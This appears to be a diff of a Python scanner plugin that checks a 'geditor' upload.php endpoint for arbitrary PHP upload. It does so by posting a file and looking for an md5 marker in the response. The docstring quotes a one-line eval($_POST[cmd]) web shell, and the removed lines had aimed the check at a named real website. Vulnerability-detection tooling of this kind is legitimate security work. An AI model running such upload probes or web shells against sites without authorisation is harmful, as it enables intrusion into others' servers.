@@ -3,8 +3,6 @@
 # __Author__ = angel
 # _PlugName_ = gedior upload
 import re
-
-
 def curl3(
         url, post=None, raw=None, proxy=None, method=None,
         referer=None, cookie=None,
@@ -15,21 +13,18 @@ def curl3(
         Curl3: 支持上传文件,字典形式 header, 兼容旧 curl2
         eg:
         1. 发送字典头部
-
         headers = {
             'User-Agent': 'Mozilla/4.0',
             'Content-Type': 'text/html'
         }
         code, head, res, errcode, _ = curl3(url, header=headers)
         2. 发送字典 post data
-
             post_data = {
                 'name': 'Medici.Yan',
                 'password': 'mypassword'
             }
             code, head, res, errcode, _ = curl3(url, post=post_data)
         3. 上传文件
-
         假设有表单如下:
             <form id="frmUpload" enctype="multipart/form-data"
             action="http://test.com/upload.php" method="post">up
@@ -39,9 +34,7 @@ def curl3(
                 <input type="text" name="work"  value="upload"/>
                 <input id="btnUpload" type="submit" value="Upload">
             </form>
-
         image 和 image2 都为文件类型
-
         代码如下：
             文件部分:
             files = [
@@ -52,29 +45,23 @@ def curl3(
             post_data = "token=348&work=upload&submit=Upload"
             code, head, res, errcode, _ = curl3(
                 url, upfile=files, post=post_data)
-
         Tips:
             上传要求对服务器不产生任何危害
-
             推荐上传文件内容为:
                 <?php echo md5(0x2333333);unlink(__FILE__); ?>
             unlink 函数会在访问该 php 脚本后自删除本文件
-
             不推荐上传:
                 1. <?php phpinfo(); ?>
                 2. <?php eval($_POST[cmd]);?>;
-
     """
     header_str = ""
     payload = ""
-
     """ support dict header"""
     if isinstance(header, dict):
         for i in header.keys():
             header_str += "%s: %s\r\n" % (i, header.get(i))
     else:
         header_str = header
-
     """ support dict post"""
     if isinstance(post, dict):
         import urllib
@@ -104,7 +91,6 @@ def curl3(
                 payload += "filename=\"%s\"\r\n" % upfile[i][1][0]
                 payload += "Content-Type: %s\r\n\r\n" % upfile[i][1][2]
                 payload += """%s\r\n""" % upfile[i][1][1]
-
             if post:
                 postlist = post.split('&')
                 for i in range(len(postlist)):
@@ -125,7 +111,6 @@ def curl3(
                 pass
             else:
                 header_str += '\r\n'
-
             header_str += 'Content-Type: multipart/form-data; '
             header_str += 'boundary=%s\r\n' % boundary
             # header_str += '\r\n'
@@ -135,13 +120,9 @@ def curl3(
         header=header_str, max_time=max_time,
         connect_timeout=connect_timeout,
         retry=2, retry_delay=1)
-
-
 def assign(service, arg):
     if service == 'geditor':
         return True, arg
-
-
 def audit(arg):
     upfile = 'geditor/upload.php'
     f = [
@@ -193,6 +174,6 @@ def audit(arg):
             if "5a8adb32edd60e0cfb459cfb38093755" in res2:
                 security_hole(arg + upfile)
 
-if __name__ == '__main__':
+                return arg
+if __name__== '__main__':
     from dummy import *
-    audit(assign('geditor', 'http://msgr2.talknow.co.kr/')[1])
